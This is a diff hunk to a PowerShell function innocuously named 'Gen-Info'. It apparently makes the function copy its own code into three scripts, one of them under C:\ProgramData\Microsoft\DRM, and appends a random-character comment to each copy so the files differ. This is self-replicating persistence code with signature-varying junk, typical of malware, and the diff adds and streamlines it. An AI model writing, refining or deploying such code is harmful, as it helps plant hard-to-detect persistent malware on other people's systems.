@@ -5,27 +5,19 @@ function Gen-Info {
     $charlie_path = "C:\ProgramData\Microsoft\DRM"
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
+    $funcBody = (Get-Command Gen-Info).ScriptBlock.ToString()
     if (-not (Test-Path "$alfa_path\alfa.ps1")) {
-        Set-Content -Path "$alfa_path\alfa.ps1" -Value "function Gen-Info {"
-        Add-Content -Path "$alfa_path\alfa.ps1" -Value "$MyInvocation.MyCommand.Definition"
-        Add-Content -Path "$alfa_path\alfa.ps1" -Value "# $random_chars"
-        Add-Content -Path "$alfa_path\alfa.ps1" -Value "}"
+        "function Gen-Info {$funcBody`n}`n# $random_chars" | Out-File -FilePath "$alfa_path\alfa.ps1" -Encoding UTF8
     }
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
     if (-not (Test-Path "$bravo_path\bravo.ps1")) {
-        Set-Content -Path "$bravo_path\bravo.ps1" -Value "function Gen-Info {"
-        Add-Content -Path "$bravo_path\bravo.ps1" -Value "$MyInvocation.MyCommand.Definition"
-        Add-Content -Path "$bravo_path\bravo.ps1" -Value "# $random_chars"
-        Add-Content -Path "$bravo_path\bravo.ps1" -Value "}"
+        "function Gen-Info {$funcBody`n}`n# $random_chars" | Out-File -FilePath "$bravo_path\bravo.ps1" -Encoding UTF8
     }
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
     if (-not (Test-Path "$charlie_path\charlie.ps1")) {
-        Set-Content -Path "$charlie_path\charlie.ps1" -Value "function Gen-Info {"
-        Add-Content -Path "$charlie_path\charlie.ps1" -Value "$MyInvocation.MyCommand.Definition"
-        Add-Content -Path "$charlie_path\charlie.ps1" -Value "# $random_chars"
-        Add-Content -Path "$charlie_path\charlie.ps1" -Value "}"
+        "function Gen-Info {$funcBody`n}`n# $random_chars" | Out-File -FilePath "$charlie_path\charlie.ps1" -Encoding UTF8
     }
     
     
